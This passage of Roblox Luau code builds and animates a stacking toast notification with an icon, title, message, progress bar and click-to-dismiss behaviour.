    frame.Position = UDim2.new(1, width + 20, 1, -12)
    frame.AnchorPoint = Vector2.new(1, 1)
    frame.BackgroundColor3 = Config.colors.header
    frame.BorderSizePixel = 0
    frame.Parent = notifGui

    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Config.colors.accent
    stroke.Thickness = 1
    stroke.Transparency = 0.7

    local progressBg = Instance.new("Frame", frame)
    progressBg.Size = UDim2.new(1, 0, 0, 3)
    progressBg.Position = UDim2.new(0, 0, 1, -3)
    progressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    progressBg.BorderSizePixel = 0
    Instance.new("UICorner", progressBg).CornerRadius = UDim.new(0, 2)

    local progressBar = Instance.new("Frame", progressBg)
    progressBar.Size = UDim2.new(1, 0, 1, 0)
    progressBar.BackgroundColor3 = Config.colors.accent
    progressBar.BorderSizePixel = 0
    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 2)

    local iconSize = height - 30
    local icon = Instance.new("ImageLabel", frame)
    icon.Size = UDim2.new(0, iconSize, 0, iconSize)
    icon.Position = UDim2.new(0, 12, 0.5, -2)
    icon.AnchorPoint = Vector2.new(0, 0.5)
    icon.BackgroundTransparency = 1
    icon.ScaleType = Enum.ScaleType.Fit

    local iconMap = {
        success = {Icons.check, Config.colors.success},
        error   = {Icons.alert, Config.colors.error},
        warning = {Icons.alert, Config.colors.warning},
        shield  = {Icons.shield, Config.colors.accent},
        key     = {Icons.key, Config.colors.accent},
        copy    = {Icons.copy, Config.colors.success},
        close   = {Icons.close, Config.colors.error},
    }
    local iconData = iconMap[iconType] or {Config.logo_asset, Config.colors.text}
    icon.Image = iconData[1]
    icon.ImageColor3 = iconData[2]

    local textX = 12 + iconSize + 12

    local titleLabel = Instance.new("TextLabel", frame)
    titleLabel.Size = UDim2.new(1, -(textX + 12), 0, 22)
    titleLabel.Position = UDim2.new(0, textX, 0, 10)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Config.fonts.main
    titleLabel.TextSize = math.clamp(Config.textSizes.notifTitle * scale, 12, 16)
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.TextColor3 = Config.colors.text
    titleLabel.Text = title
    titleLabel.TextTruncate = Enum.TextTruncate.AtEnd

    local messageLabel = Instance.new("TextLabel", frame)
    messageLabel.Size = UDim2.new(1, -(textX + 12), 0, 20)
    messageLabel.Position = UDim2.new(0, textX, 0, 32)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Font = Config.fonts.body
    messageLabel.TextSize = math.clamp(Config.textSizes.notifBody * scale, 10, 14)
    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
    messageLabel.TextColor3 = Config.colors.textDim
    messageLabel.Text = message
    messageLabel.TextTruncate = Enum.TextTruncate.AtEnd

    local id = tick() .. HttpService:GenerateGUID(false)
    table.insert(NotificationList, {id = id, frame = frame, gui = notifGui, height = height})

    local function restack()
        local yOffset = 0
        for i = #NotificationList, 1, -1 do
            local n = NotificationList[i]
            if n and n.frame and n.frame.Parent then
                TweenService:Create(n.frame, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
                    Position = UDim2.new(1, -12, 1, -12 - yOffset)
                }):Play()
                yOffset = yOffset + n.height + 10
            end
        end
    end

    TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {
        Position = UDim2.new(1, -12, 1, -12)
    }):Play()

    task.wait(0.1)
    restack()

    local function dismiss()
        for i, n in ipairs(NotificationList) do
            if n.id == id then table.remove(NotificationList, i) break end
        end
        TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
            Position = UDim2.new(1, width + 20, frame.Position.Y.Scale, frame.Position.Y.Offset)
        }):Play()
        task.wait(0.3)
        notifGui:Destroy()
        restack()
    end

    if duration and duration > 0 then
        TweenService:Create(progressBar, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
            Size = UDim2.new(0, 0, 1, 0)
        }):Play()
        task.delay(duration, dismiss)
    end

    local clickButton = Instance.new("TextButton", frame)
    clickButton.Size = UDim2.new(1, 0, 1, 0)
    clickButton.BackgroundTransparency = 1
    clickButton.Text = ""
    clickButton.MouseButton1Click:Connect(dismiss)
end

